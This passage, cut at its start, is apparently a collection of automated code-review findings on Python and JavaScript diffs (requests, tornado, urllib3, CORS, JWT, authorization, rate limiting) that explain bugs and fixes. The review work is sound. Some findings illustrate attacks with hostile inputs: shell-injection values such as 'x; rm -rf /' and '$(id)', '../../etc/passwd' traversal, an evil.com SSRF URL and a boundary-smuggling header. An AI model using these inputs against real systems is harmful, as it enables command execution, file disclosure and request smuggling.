Either grep the codebase for `page_size=` at `list_invoices` call sites and update them in this PR, or keep backwards compatibility for a release (e.g. accept `page_size=None` and map it onto `limit` with a deprecation warning).

findings.title: `from adapters import HTTPAdapter` is not a package-relative import
findings.body: Every other intra-package import in this module is explicitly relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). `from adapters import HTTPAdapter` will resolve against `sys.path`, not the `requests` package, so importing `requests.sessions` raises `ImportError` on Python 3 (and on Python 2 only works by accident via implicit relative imports). Change it to `from .adapters import HTTPAdapter`.

findings.title: New `request()` accepts but silently ignores timeout, verify, cert, prefetch, return_response
findings.body: The new `request()` keeps the full public signature but only forwards `method, url, headers, files, data, params, auth, cookies, allow_redirects, proxies, hooks` onto the `Request` object, then calls `self.send(prep)` with no extra arguments. `timeout`, `verify`, `cert`, `prefetch`, `config` and `return_response` are accepted and discarded, so `requests.get(url, timeout=1)` will now hang indefinitely and `verify=False`/`cert=...` silently changes TLS behaviour back to the default — failures that are invisible rather than loud. Additionally, session-level state (`self.headers`, `self.cookies`, `self.auth`, `self.params`, `self.config`) is no longer merged into the request at all, so a configured `Session` behaves like a bare one. Either thread these through to `send()`/the adapter or raise on the unsupported ones while the refactor is in progress.

findings.title: `old_request` still calls the deleted `_send_request`
findings.body: `_send_request` was removed in this diff, but the retained `old_request` body still ends with `return self._send_request(r, **args)`. Any call that reaches that path raises `AttributeError: 'Session' object has no attribute '_send_request'`. Either keep `_send_request` until `old_request` is deleted, or delete `old_request` in the same change.

findings.title: `close()` is now a no-op while `send()` builds a fresh adapter per request
findings.body: `send()` constructs a new `HTTPAdapter()` — and therefore a new `PoolManager` — on every call, and `close()` (also reached via `__exit__`) no longer clears anything. Connection reuse across requests is gone, and each request's pooled sockets are only reclaimed when the adapter is garbage-collected, so `with Session() as s:` no longer releases anything deterministically. The adapter should be created once (e.g. in `__init__`) and `close()` should delegate to it. Note also that `PoolManager` at line 19 is now imported but unused here, and any code that still reads `session.poolmanager` (removed with `init_poolmanager`) will now fail.

findings.title: verify/cert silently dropped in new request() path
findings.body:
The new `request()` signature still accepts `verify` and `cert` (lines 148-149) and `timeout` (line 141), but the body only copies `method, url, headers, files, data, params, auth, cookies, allow_redirects, proxies, hooks` onto `req` before calling `req.prepare()` and `self.send(prep)`. `verify`, `cert` and `timeout` are never read again, and `send()` (line 364-367) constructs a bare `HTTPAdapter()` with no configuration, so nothing downstream can recover them either.

Consequences: a caller that pins a private CA bundle (`verify='/path/ca.pem'`) or supplies a client certificate (`cert=(...)`) gets neither applied — the connection falls back to whatever the freshly-constructed adapter defaults to, with no error raised. The adversary is a network-position attacker (hostile Wi-Fi, upstream proxy, BGP/DNS hijack); what they control is the TLS peer presented to the client; what they get is an accepted connection under a chain the caller explicitly tried to constrain, plus loss of client-cert mutual auth. Silently ignoring a security argument is worse than rejecting it, because the caller has no signal.

Dropping `timeout` additionally means a slow or wedged peer can hang the caller indefinitely.

Plumb `verify`, `cert` and `timeout` through to `send()`/the adapter, or raise `NotImplementedError` for them while the refactor is in flight.

findings.title: New request()/send() pipeline and no-op close() are untested in this diff
findings.body: The rewritten `request()` method builds a `Request`, calls `.prepare()`, and routes through `self.send()`, which now delegates to a new `HTTPAdapter.send()` instead of the removed `PoolManager`-backed path. `close()` was also changed to a no-op (`pass`), removing the PoolManager cleanup it used to perform. None of these behavior changes are accompanied by tests in this diff, so if `req.prepare()` fails, if `HTTPAdapter.send()` doesn't return a proper response, or if `close()` silently leaking connections regresses something, nothing here would fail to signal it.

findings.title: Docstring removed from close() after behaviour changed
findings.body: The `close()` method previously documented that it disposed of internal state and closed pooled connections via `self.poolmanager.clear()`. That docstring was removed when the method body changed to `pass`, leaving callers with no indication that close() is now a no-op. Either restore appropriate documentation explaining the new behaviour or remove the now-useless method entirely.

findings.title: send() docstring is now incomplete
findings.body: The `send()` method's docstring 'Send a given PreparedRequest.' describes only the input, not the implementation change introduced by this refactor. The method now creates an HTTPAdapter and delegates to it. The docstring does not become false, but it should mention that the actual sending is performed by an adapter, or at minimum be updated to reflect the new architecture.

findings.title: cookies returns None on malformed Cookie header, crashing callers
findings.body:
On a parse failure the new property sets `self._cookies = None` and returns `None` (and, because `hasattr(self, "_cookies")` is now True, keeps returning `None` for the life of the request). The two call sites left in `web.py` assume a mapping: `name in self.request.cookies` (line 321) raises `TypeError: argument of type 'NoneType' is not iterable`, and `self.request.cookies.iterkeys()` (line 367) raises `AttributeError`. Any client sending a header `Cookie.SimpleCookie.load` chokes on turns every `get_cookie`/`get_secure_cookie` call into a 500. The old code recovered by calling `clear_all_cookies()` and leaving `_cookies` a `SimpleCookie`. Since `HTTPRequest` cannot emit Set-Cookie headers, the equivalent safe behaviour is to reset to an empty `Cookie.SimpleCookie()` rather than `None`.

_Also raised by the security agent:_ Malformed Cookie header makes request.cookies None, crashing all callers

findings.title: Public RequestHandler.cookies removed instead of aliased to request.cookies
findings.body: `RequestHandler.cookies` was a documented public property used by application subclasses and templates (`handler.cookies`). The diff deletes it outright and rewrites only the two in-tree callers, so any external code doing `self.cookies` / `handler.cookies` now fails with `AttributeError`. Keep a thin forwarding property on `RequestHandler` (`return self.request.cookies`) so the move stays backwards compatible.

findings.title: Behavior change on cookie parse failure is untested
findings.body: The original RequestHandler.cookies property called self.clear_all_cookies() when Cookie.load() raised; the new HTTPRequest.cookies property instead sets self._cookies = None. This means get_cookie() and clear_all_cookies() would now raise a TypeError (NoneType has no __getitem__/iterkeys) on malformed cookie headers instead of gracefully clearing cookies. No test exercises a malformed Cookie header through get_cookie or clear_all_cookies, so this behavior change would pass unnoticed.

findings.title: Malformed cookies are no longer cleared on the client
findings.body: Previously a `Cookie` header that failed to parse triggered `clear_all_cookies()`, which sent expiry Set-Cookie headers so the bad cookie would not be resent on every subsequent request. After the move the parse failure is handled inside `HTTPRequest`, which has no way to write response headers, so the poisoned cookie persists and the failure repeats on every request from that client. If that recovery behaviour is intentionally dropped it should be noted; otherwise the handler needs to detect the parse failure and still clear.

findings.title: Missing strip() makes boundary lookup fail for the standard header form
findings.body:
`content_type.split(";")` yields the parameter segments with their leading whitespace intact. For the overwhelmingly common header `multipart/form-data; boundary=----WebKitFormBoundaryXyz`, the second element is `" boundary=----WebKitFormBoundaryXyz"`, so `partition("=")` gives `k == " boundary"` and the `k == "boundary"` test never succeeds. The loop then completes without `break`, the `for/else` fires, and the body is discarded with an "Invalid multipart/form-data" warning. The previous code (`if 'boundary=' in content_type`) was whitespace-insensitive, so this is a regression that silently breaks all file/multipart uploads.

Fix: partition the stripped segment, e.g. `k, sep, v = field.strip().partition("=")`. Consider also stripping the value (trailing whitespace) and surrounding double quotes, since RFC 2045 permits `boundary="..."`.

findings.title: Content-Type parameter not stripped, so `boundary` is never matched
findings.body:
`content_type.split(";")` yields parameters that retain the leading space browsers and HTTP libraries emit (`multipart/form-data; boundary=----abc`), so `k` is `" boundary"` and the `k == "boundary"` test never succeeds. The loop then falls through to the `for/else` branch and logs "Invalid multipart/form-data", silently discarding every multipart body — form fields and uploaded files simply disappear from `self._request.arguments`/`files` while the request is still dispatched to `request_callback`.

Fix by normalising each parameter before comparing, e.g. `k, sep, v = field.strip().partition("=")`, and also strip surrounding double quotes from `v`, since RFC 2045 permits `boundary="----abc"` and the quotes would otherwise be included in the delimiter passed to `_parse_mime_body`.

Security relevance is secondary but real: handlers that rely on a posted field being present (e.g. a CSRF token or an authorisation parameter carried in a multipart form) will see it as absent rather than as wrong, and behaviour then depends on how each handler treats a missing value. It also creates a parser differential with any upstream proxy or scanner that does parse the body.

findings.title: No test covers multi-field Content-Type boundary parsing
findings.body: The change replaces a naive 'boundary is last' assumption with a loop that scans all Content-Type parameters for 'boundary='. No test exercises a Content-Type header where boundary is not the first field (e.g. 'multipart/form-data; charset=utf-8; boundary=xyz'), nor one with a boundary containing '=' in its value, nor a header with leading/trailing whitespace around 'boundary' (which would fail the exact-match `k == "boundary"` check). Without such a test, a regression in this parsing logic would go undetected.

findings.title: get_host() misparses host for URLs with '?' or '#' before '@'
findings.body:
`get_host()` splits on `://`, then `/`, then `@`, then `:`, but never removes the query string or fragment first. For `http://good.com?@evil.com/` the `/`-split yields `good.com?@evil.com`, the `@`-split then discards `good.com?` as "userinfo" and returns host `evil.com`. `urlparse`/`urlsplit` return `good.com` for the same URL (query and fragment are stripped before userinfo is considered). The reverse case also holds: `http://evil.com#@good.com` returns `good.com` here.

Adversary: anyone who can supply a URL to an application that uses urllib3 — e.g. a webhook target, an image-fetch parameter, a redirect target. What they control: the full URL string. What they get: if the application validates the destination with the stdlib parser (`urlsplit(url).hostname in ALLOWED`) and then hands the same string to urllib3, the connection is made to a host the validator never saw — an SSRF / allowlist bypass. Even without an explicit allowlist, logs and callers that display the "intended" host disagree with the socket that is actually opened.

Fix: strip the fragment (`url.split('#', 1)[0]`) and query (`split('?', 1)[0]`) before the `@` and `:` handling, or delegate to `urlsplit` and use its `hostname`/`port`. Note also that with the current order a URL with no path but a query, e.g. `http://good.com?x=1`, returns the host `good.com?x=1`.

I can see the sink (the returned host is what callers connect to) but not the entry point in this diff — the callers of `get_host` are not in the retrieved context — so confidence is reduced accordingly.

findings.title: LocationParseError message never interpolates the URL
findings.body: The raise passes the literal string `"Failed to parse: %s"` with no `% url` (or `% port`) applied, so anyone catching or logging this exception sees the raw placeholder instead of the value that failed to parse — making malformed-URL reports undebuggable. Change to `raise LocationParseError("Failed to parse: %s" % url)` (or pass the location if `LocationParseError` formats it itself).

findings.title: make_headers has non-trivial branching logic with no visible test
findings.body: make_headers has several branches (accept_encoding as str/list/other, basic_auth encoding, keep_alive) that could regress silently if this is genuinely new code rather than a straight move from an already-tested module. No test file is included in this diff to confirm coverage moved with it.

findings.title: get_host parsing edge cases (port validation, auth stripping) untested here
findings.body: get_host has several sequential string-split branches, including a port-validation path that raises LocationParseError. If the move introduced a subtle bug (e.g., in ordering of '@' vs ':' splitting), nothing in this diff would catch it.

findings.title: Sorting by 'status' column is never tested
findings.body: The SORTABLE dict adds three valid keys (created_at, amount, status), and the tests cover created_at (default) and amount, but no test exercises sort="status". If the status column mapping were wrong (e.g. mismatched name) or its ordering behaved unexpectedly, nothing would catch it.

findings.title: No test exercises describe() for click/key events
findings.body: The change removes explicit casts and relies on TypeScript's discriminated-union narrowing for `event.x` and `event.code`. There is no test file in this diff verifying that `describe()` still returns the correct string for both 'click' and 'key' event kinds. If the narrowing were ever broken (e.g., by a future change to the Event union that reintroduces ambiguity), only a type error would be caught at compile time — a runtime behavioral regression (wrong property read) would not be caught by any test.

findings.title: HTTPMove.location now returns URL object, not string
findings.body:
The `location` attribute is now assigned a `URL(location)` object rather than the original string. However, the documented contract in `docs/web_reference.rst` explicitly states it should be 'the string it was constructed with'. Application code that relies on this documented behavior—such as using `str.startswith()` directly on `self.location`—will break because `URL` objects do not support string methods like `startswith()`. The documentation must be updated to reflect that `location` is now a `URL` object, or the implementation must be changed back to store the string.

_Also raised by the security agent:_ location attribute type change can defeat redirect allowlist checks

_Also raised by the correctness agent:_ `HTTPMove.location` now returns a URL object, not the original string

findings.title: No test guards `location` attribute's type/string behavior
findings.body: `self.location` now stores a `URL` object instead of the original string, per docs/web_reference.rst which specifies location is 'the string it was constructed with' and is used with `str.startswith`. There's no test in this diff (or apparent in the change) that asserts `instance.location` equals the original string or supports `startswith`. If this behavior is wrong, nothing would fail — existing tests likely only check the `Location` header value, not the `.location` attribute's type.

findings.title: `if` instead of `while` lets readany return empty bytes before EOF
findings.body:
`_wait()` is documented to resolve not only on `feed_data()`/`feed_eof()` but also "at the end of a chunk, which can happen with no new data in the buffer", and it explicitly requires that "a caller must re-check its condition after waking rather than assuming data arrived." Replacing the `while` loop with a single `if` removes exactly that re-check: after a spurious wake the buffer can still be empty and `_eof` still false, so `self._read_nowait(-1)` on line 8 returns `b''`. Callers of `readany()` treat an empty return as end-of-stream, so a reader can terminate early and silently truncate the body. Restore the `while` loop so the condition is re-evaluated after every wake.

_Also raised by the security agent:_ Single `if` around `_wait()` lets a remote peer force an empty read

findings.title: No test covers spurious-wake behavior for readany()
findings.body: The change replaces `while not self._buffer and not self._eof` with a single `if`, so readany() now only waits once even though `_wait`'s own docstring says the waiter can be resolved at the end of a chunk with no new data, requiring the caller to re-check its condition. If a spurious wake occurs, this method would now return an empty read result instead of continuing to wait. Nothing in the diff or visible test suite exercises the case where `_wait` returns without new buffer data, so this regression would not be caught.

findings.title: Implicit relative import breaks module loading on Python 3
findings.body: `from .adapters import HTTPAdapter` and `from adapters import HTTPAdapter` are not the same module reference. The dotted form explicitly resolves to `requests.adapters`; the undotted form is an implicit relative import, which only works on Python 2 without `absolute_import`. Under Python 3 (or any module compiled with `from __future__ import absolute_import`) it resolves against `sys.path`, raising `ModuleNotFoundError: No module named 'adapters'` at import time of `requests.sessions` — i.e. the whole package fails to import. Even on Python 2 it silently prefers a top-level `adapters` module if one exists on the path, which would bind the wrong `HTTPAdapter`. Restore the leading dot.

findings.title: Top-level `import adapters` allows sys.path module hijacking
findings.body:
`from .adapters import HTTPAdapter` resolved unambiguously to the sibling module inside the `requests` package. `from adapters import HTTPAdapter` is an absolute import under Python 3 (and a sys.path fallback under Python 2 once the package directory misses), so resolution now depends on whatever `adapters` module happens to be first on `sys.path` — the script directory, the current working directory for `python -c`/`-m` invocations, or any writable entry such as a shared site-packages or a world-writable deploy dir.

Adversary: anyone who can place a file on the importing process's `sys.path` (a local user on a shared host, a colliding third-party distribution publishing a top-level `adapters` module, or an attacker who can write into a deployment directory). What they control: the entire contents of `adapters.py`. What they get: arbitrary code executed at import time inside every process that imports `requests.sessions`, plus control of the `HTTPAdapter` that all HTTP traffic flows through (TLS verification, proxying, response handling).

Restore the explicit relative form `from .adapters import HTTPAdapter`, which pins the lookup to the package and cannot be shadowed.

findings.title: No test would catch the broken import (Python 3 / no implicit relative imports)
findings.body: Changing `from .adapters import HTTPAdapter` to `from adapters import HTTPAdapter` relies on implicit relative imports, which are invalid in Python 3 and only work in Python 2 when the package's containing directory is on sys.path. If the module is imported as part of the `requests` package under Python 3 (or via `import requests`), this will raise ImportError at import time. There is no test in this diff, and nothing shown in the repo context confirms an existing test imports `requests.sessions` in a way that would catch this failure.

findings.title: Removed None guard: get_cookie raises TypeError on unparseable Cookie header
findings.body:
`self.request.cookies` is documented and implemented to return `None` when the `Cookie` header is present but cannot be parsed (see `tornado/httpserver.py`, which returns `None` from the property and states "every consumer has to allow for that"). With the guard removed, `name in self.request.cookies` evaluates `in` against `None` and raises `TypeError: argument of type 'NoneType' is not iterable` instead of returning `default`.

This is reachable from any client sending a malformed Cookie header, turning a benign `default` return into a 500. Restore the guard (`if self.request.cookies is not None and name in self.request.cookies:`), or — if the intent really is that `cookies` is always a mapping — change the property to return an empty dict instead of `None` and update its docstring in the same change.

_Also raised by the security agent:_ Removed None guard lets a malformed Cookie header crash any handler

findings.title: No test covers get_cookie when request.cookies is None
findings.body: The retrieved httpserver.py explicitly documents that `cookies` is set to None when the Cookie header is present but unparseable, contradicting the PR's premise that cookies is 'always a mapping after construction'. The diff removes the `is not None` guard in get_cookie, which would raise a TypeError on `name in None` if this case occurs. There is no test in this change (or apparently in the surrounding suite) exercising get_cookie with a malformed Cookie header, so this regression would go undetected.

findings.title: Dropping strip() breaks boundary detection for normal Content-Type headers
findings.body: `content_type.split(";")` leaves the leading space present in virtually every real header (`multipart/form-data; boundary=----X`). The removed `.strip()` was what normalised each parameter before `partition("=")`; without it `k` is `" boundary"`, the `k == "boundary"` test on line 5 never matches, `_parse_mime_body` is never called, and multipart bodies are silently dropped (no arguments/files parsed, no error raised). The strip also removed trailing whitespace/CR that would otherwise become part of the boundary value passed on line 6. Restore `field.strip().partition("=")` (stripping the whole field, not just the value).

findings.title: Dropping strip() on Content-Type params creates a boundary parser differential
findings.body:
`content_type` is the client-supplied `Content-Type` request header; it is split on `;` and each parameter is matched against `boundary` before the value is passed to `self._parse_mime_body(v, data)` on line 6. RFC 7231/2045 allow (and essentially every HTTP client emits) optional whitespace after the `;`, so the normal header `multipart/form-data; boundary=abc` yields `k == " boundary"` and no longer matches — the body is silently left unparsed, so arguments and files are empty.

The security consequence is the asymmetry this introduces. A client fully controls the header, so it can send `Content-Type: multipart/form-data; boundary=A;boundary=B`. Any RFC-correct parser in front of Tornado (reverse proxy, WAF, upload scanner, or a second Tornado instance that still strips) takes the first parameter, `A`; this code skips ` boundary=A` because of the leading space and parses the body with `B` instead. The two components then disagree about where parts begin and end, which is exactly the primitive used to smuggle a file or form field past an inspecting front end. The same header also lets an attacker suppress multipart parsing entirely on demand while the front end still sees a well-formed upload.

Restore `field.strip().partition("=")` (and, if anything, strip the value too) so parameter matching follows the grammar every other parser uses.

findings.title: No test guards removal of field.strip() before boundary match
findings.body: The change drops the .strip() call, so `k` now retains leading whitespace (e.g. " boundary" from "multipart/form-data; boundary=xyz"), which would break the `k == "boundary"` comparison on line 5 for any Content-Type header with a space after the semicolon (a very common format). No test exercises this parsing path with a realistic header value containing whitespace, so this behavior change could silently break multipart boundary detection without anything failing.

findings.title: Format placeholder left unsubstituted in LocationParseError message
findings.body: The `% url` argument was removed but the `%s` placeholder was left in the string, so the raised exception reads literally `Failed to parse: %s` and no longer identifies the URL that failed. If the intent was to shorten the message, remove the placeholder too (e.g. `LocationParseError(url)` or `LocationParseError("Failed to parse")`); if the URL should still be reported, restore `% url`.

findings.title: No test exercises the invalid-port LocationParseError path
findings.body: The change drops the `% url` argument from the raise statement, leaving a literal `%s` with no substitution. If this line executes (e.g. calling the URL/port parser with a non-digit port), Python will raise a TypeError from the `%` operator instead of the intended LocationParseError, since there's a missing argument for the format placeholder. There is no test in this diff (or referenced) that calls the parsing function with a malformed port to confirm a LocationParseError is raised with a sensible message, so this regression would go undetected.

findings.title: create_archive interpolates arguments into a shell command unquoted
findings.body:
`cmd` is built with an f-string and executed with `shell=True`, so `name` and `directory` are parsed by the shell rather than passed as literal argv entries. Two concrete consequences:

1. Correctness: a directory named `my data` becomes two separate tar operands, so tar tries to archive `my` and `data` and fails or archives the wrong thing. A `name` containing `/` or `..` silently writes outside `/exports`.
2. Safety: any metacharacter in either argument is executed — e.g. `directory="x; rm -rf /"` or `name="a$(id)"` runs the injected command with the caller's privileges.

Drop the shell and pass an argument list, matching `list_exports` on line 5:

```python
def create_archive(name, directory):
    target = os.path.join("/exports", f"{name}.tar.gz")
    return subprocess.run(["tar", "-czf", target, directory], check=True)
```

and validate that `name` is a bare filename (no separators, no `..`) before joining it into `/exports`.

_Also raised by the security agent:_ Command injection via shell=True in create_archive

findings.title: No test coverage for new create_archive function
findings.body: create_archive builds a shell command via string interpolation and executes it with shell=True. There is no test in this diff exercising this function at all, so a regression (e.g. broken quoting, wrong path, injection-enabling input) would not be caught by any existing test suite.

findings.title: Return shape differs from list_exports and tar's error output is not captured
findings.body: `list_exports` returns `.stdout` (bytes), while `create_archive` returns the whole `CompletedProcess`, so callers of this module get two different shapes from two sibling functions. Also, without `capture_output=True`, tar's stderr leaks to the parent process's stderr and is not attached to the `CalledProcessError` raised by `check=True`, which makes a failed archive hard to diagnose programmatically. Consider `capture_output=True` and returning a consistent value (e.g. the archive path).

findings.title: Wildcard CORS origin combined with credentials: true
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, discarding the `ALLOWED` allowlist that the existing export on lines 6-7 enforces. Any route mounted with this middleware accepts cross-origin requests from every site on the internet and instructs the browser to attach the victim's cookies.

Adversary: any web page the victim visits while logged in. What they control: a script issuing `fetch(api, {credentials: 'include'})` from their own origin. What they get: authenticated reads of the victim's API responses and authenticated state-changing calls, with no CSRF token needed because the browser is told the response is readable cross-origin.

Fix: reflect only the dashboard origin — add it to `ALLOWED` and reuse the existing config, or pass an explicit origin string/function. Never pair `credentials: true` with a wildcard.

Note also that with the `cors` package a literal `*` is emitted verbatim, which browsers reject for credentialed requests — so this configuration is likely to be both insecure in intent and non-functional for the dashboard, and someone will next "fix" it by reflecting `req.headers.origin`, which is the same hole made effective.

_Also raised by the correctness agent:_ Wildcard origin with credentials:true is rejected by browsers

findings.title: New dashboardCors config has no test coverage
findings.body: The new `dashboardCors` export combines `origin: "*"` with `credentials: true`, which is invalid per CORS spec (browsers reject wildcard origin when credentials are allowed) and is also a known misconfiguration pattern. No test exists in this diff to verify the actual behavior of this exported middleware (e.g., what Access-Control-Allow-Origin header value it produces, or whether it should instead reflect a specific dashboard origin). If this configuration is wrong or needs to echo a specific origin, nothing would catch it.

findings.title: Live AcmePay secret key hardcoded in source, replacing env lookup
findings.body:
`ACMEPAY_SECRET_KEY = "acme_live_..."` is a production payment-provider credential (the `acme_live_` prefix marks it as a live-mode key, not test-mode) committed in plaintext, and `client()` now assigns it to `acmepay.api_key` instead of reading `os.environ["ACMEPAY_SECRET_KEY"]`.

Adversary: anyone with read access to this repository or any artifact derived from it — outside contributors, anyone who clones or forks, CI log/image scrapers, or anyone who obtains a built container. What they control: nothing; they only need read access. What they get: a live payments API key, i.e. the ability to create charges, issue refunds to accounts they control, and read customer/payment records through the provider API.

Actions: (1) treat this key as compromised and rotate/revoke it at AcmePay now — committing it means it is also in git history and in every existing clone, so deleting the line is not sufficient; (2) restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (the `import os` removal on the same hunk must be reverted too); (3) consider a secret-scanning pre-commit/CI hook so this class of change is blocked automatically.

findings.title: Removing env lookup makes every environment use the live key
findings.body: `client()` previously read `acmepay.api_key` from `os.environ["ACMEPAY_SECRET_KEY"]`, so each deployment (dev, CI, staging, prod) could inject its own key, and a missing key failed loudly with a `KeyError`. After this change the module-level constant `ACMEPAY_SECRET_KEY` (an `acme_live_...` key) is used unconditionally, and the `os` import is dropped. Any environment that relied on setting `ACMEPAY_SECRET_KEY` — including test/staging — now silently authenticates against the live account and can move real money. Restore the environment lookup (optionally with an explicit, non-live default and a clear error when unset) rather than baking a value into the source.

findings.title: client() behaviour change has no test asserting api_key source
findings.body: The change removes the os.environ lookup and hardcodes ACMEPAY_SECRET_KEY directly into client(). No test in this PR calls client() and asserts acmepay.api_key equals the expected value or is sourced from an environment variable. The only test-related addition is a fixture (tests/fixtures/acmepay.py) that defines a fake client dict but is never wired into an actual test invoking client(). If this regressed further (e.g. wrong key, wrong assignment target), nothing would fail.

findings.title: fake_client() return shape does not match client()
findings.body: `client()` returns the `acmepay` module itself, so callers use it as `client().Charge.create(...)` or similar attribute access. `fake_client()` returns a plain dict `{"api_key": TEST_KEY}`, which supports no attribute access at all. If this fixture is substituted for `client()` in the payments suite, the tests will fail with `AttributeError` — or, worse, be written against the dict shape and stop exercising the real call path. Return a stub object exposing the same attributes the production code uses.

findings.title: tenant_of() trusts an unverified JWT claim for tenant identity
findings.body:
`tenant_of()` calls `jwt.decode(..., options={"verify_signature": False})` and returns `unverified["tenant_id"]` directly. Signature verification is the only thing binding the claims to the issuer, so anyone who can reach an endpoint with a bearer token can mint an arbitrary unsigned JWT (or edit the payload of a valid one) and set `tenant_id` to any value they like. If any caller uses this return value to scope a query, pick a database/schema, or decide which tenant's records to read or write, this is direct cross-tenant access with no credential needed beyond a self-authored token.

The existing `claims_for()` on line 7 already does the right thing with `public_key()` and `algorithms=["RS256"]`. Derive the tenant from those verified claims instead: `return claims_for(token)["tenant_id"]`. If the motivation was avoiding a key-store round-trip, cache the public key (JWKS keys are stable and cacheable) rather than skipping verification. Note also that skipping verification skips `exp`/`aud` checks, so expired and cross-audience tokens are accepted too.

findings.title: tenant_of returns a tenant for tokens claims_for would reject
findings.body: `tenant_of` decodes with `options={"verify_signature": False}`. In PyJWT, disabling signature verification also switches off the dependent claim checks (`exp`, `nbf`, `aud`, `iss`) unless they are re-enabled explicitly, so this function happily returns a tenant id for an expired, forged, or otherwise invalid token — a token that `claims_for` on line 7 would raise on. Any caller that pairs `tenant_of(token)` with a separate `claims_for(token)` will also silently diverge if the two disagree, because nothing ties the returned tenant to the verified claim set. Derive the tenant from the verified result (`claims_for(token)["tenant_id"]`), or at minimum re-enable `verify_exp`/`verify_aud` and re-check the tenant against the verified claims before use.

findings.title: Public JWT decoder lacks security contract documentation
findings.body: The `tenant_of()` function decodes a JWT without signature verification (line 11: `verify_signature: False`). This is a deliberate security choice with significant implications: callers can extract claims from any JWT, including forged or tampered tokens. A caller who assumes this function validates the token—a reasonable assumption given the name mirrors the trusted `claims_for()` function above it—will use it in contexts requiring authentication, with compromised security. The function needs a docstring explaining that it returns unverified claims and should only be used in specific contexts (e.g., extracting metadata before full verification, not for authorization decisions).

findings.title: No test for tenant_of() extracting unverified tenant claim
findings.body: tenant_of() decodes the token without verifying its signature and trusts the tenant_id claim inside. If this function were wrong (e.g. swallowed exceptions, wrong key name, or accidentally validated/rejected malformed tokens differently than intended), nothing in this diff would catch it. Add a test asserting that tenant_of() returns the expected tenant_id from a token with an arbitrary/invalid signature, and a test for the behavior when the claim is missing.

findings.title: update_payment_method mutates object without require_owner check
findings.body:
`update_payment_method` resolves `pm` directly from the caller-supplied `pm_id` and writes `body["billing_name"]` to it, then persists with `pm.save()` — no ownership check is performed. The read path immediately above (line 6) calls `require_owner(current_user(request), pm)`, and `api/auth.py` documents that "Every object mutation must call this". Note that `user` is bound on line 11 but never used, which is the tell that the check was dropped.

Adversary: any signed-in user (authentication is satisfied, authorisation is not). What they control: the `pm_id` path/query parameter and the request body. What they get: the ability to enumerate or guess other users' payment-method ids and overwrite the billing name on cards they do not own — tampering with billing records and a plausible stepping stone for social-engineering or chargeback abuse; the returned `pm.to_dict()` also discloses the victim's payment-method record back to the attacker.

Fix: insert `require_owner(user, pm)` immediately after line 12, before any attribute assignment.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unchecked body["billing_name"] raises KeyError on malformed request

_Also raised by the docs agent:_ Missing authorization check on payment method update

findings.title: No test covers authz on update_payment_method
findings.body: update_payment_method fetches the payment method and saves user-supplied data without calling require_owner (unlike get_payment_method above it, which does call require_owner on line 6). No test in this diff exercises this path, so a test that would catch one user updating another user's payment method (an ownership check regression) does not exist. Add a test asserting that calling update_payment_method with a pm_id not owned by the requesting user raises Forbidden and does not persist changes.

findings.title: Password reset endpoint left with no rate limit
findings.body:
`request_reset` is an unauthenticated entry point: the caller supplies `email`, which flows straight into `send_reset_email(email)` on line 2 with nothing between them now that `@rate_limit("5/hour")` is gone.

Adversary: any unauthenticated remote client. What they control: the `email` value and the request rate. What they get:
- Mail bombing / harassment of any address they choose, at whatever rate the process will accept.
- Cheap account enumeration if the response or timing differs for known vs. unknown addresses, now that probing is unbounded.
- Unlimited generation of live reset tokens for a target account, which matters if tokens are short-lived-but-guessable or if a token leak path exists elsewhere.
- Cost and sender-reputation damage on the mail provider.

The PR rationale — "the email provider already throttles" — does not substitute for this control. Provider throttles are aggregate, per-sender limits: they cap your outbound volume after the abuse has already been generated, they do not stop a single attacker from targeting one victim, and they do not stop enumeration probes at all (the probe is answered by your endpoint, not by the provider). Worse, relying on them means an attacker can exhaust the shared send quota and deny password resets to every legitimate user.

Restore a limiter here. If the old `5/hour` was too tight operationally, keep a limit but scope it, e.g. per-IP plus per-target-email, rather than removing it entirely.

findings.title: Reset endpoint now has no per-caller limit; provider throttling is not equivalent
findings.body:
`request_reset` previously enforced 5 requests/hour per caller via the decorator. After this change the body is `send_reset_email(email); return {"sent": True}` with no counter, no cooldown and no check on prior resets, so a single email address can be targeted with unbounded reset mail, and the endpoint can be driven as an unbounded mail-send loop.

The PR rationale is that "the email provider already throttles". That throttle, where it exists, is a global outbound quota on the sending account, not a per-recipient or per-requester limit: it does not stop one address being mailed thousands of times, and once the global quota trips it suppresses *all* transactional mail, not just the abusive requests. The two controls are not substitutes.

If the decorator really must go, replace it with an equivalent per-identifier limit (per email and per source IP) before the `send_reset_email` call, or record a last-reset-sent timestamp and short-circuit within the cooldown window. Note also that with the limiter gone the function returns `{"sent": True}` unconditionally on every call, so there is no longer any signal at all distinguishing accepted from throttled requests.

findings.title: No test guards against reintroducing or missing rate limiting on reset endpoint
findings.body: The @rate_limit decorator was removed from request_reset with no accompanying test change. If this removal is wrong (e.g. the email provider throttle is insufficient or per-account rather than per-IP), no existing test would catch excessive reset requests being processed, since no test file appears in the diff and none is referenced as covering this behavior.

findings.title: Preview path skips _confined(), allowing reads outside EXPORT_ROOT
findings.body:
The existing download path resolves the caller-supplied `name` through `_confined(name)` (line 14) before opening it. `read_export_preview` instead does a raw `os.path.join(EXPORT_ROOT, name)` on line 20. `os.path.join` does not constrain the result: a `name` of `../../etc/passwd` walks out of the export directory, and an absolute `name` such as `/etc/passwd` discards `EXPORT_ROOT` entirely. The function then returns the first `limit` bytes of that file to the caller, so the omission is directly observable as arbitrary file disclosure.

The PR description says the preview path "reuses the same layout as download" \u2014 it should reuse the same containment too. Replace line 20 with `path = _confined(name)` so both entry points share one validation routine, rather than having a second place where the check can drift.

_Also raised by the security agent:_ read_export_preview skips _confined, allowing path traversal

findings.title: Public API contract ambiguous: path confinement differs from `read_export`
findings.body: The new `read_export_preview` function accepts a `name` parameter just like `read_export` (line 14), but its implementation bypasses the `_confined()` path validation that `read_export` applies (line 14). This behavioural difference is not documented. A caller familiar with `read_export`'s safety guarantees would reasonably assume `read_export_preview` offers the same protection, but it does not. Either: (1) add explicit documentation stating that `name` is NOT confined and describing what that means, or (2) apply `_confined()` here too. The function name alone does not communicate this critical difference.

findings.title: No test exercises path confinement for new preview function
findings.body: read_export_preview builds its path with os.path.join(EXPORT_ROOT, name) directly, unlike the sibling function above which calls _confined(name) before opening. There is no test in this diff verifying that a name like '../../etc/passwd' is rejected or confined for this new function. If the confinement behavior were broken or absent (as it appears to be here), nothing would fail — no test asserts on the resolved path or raises on traversal attempts.

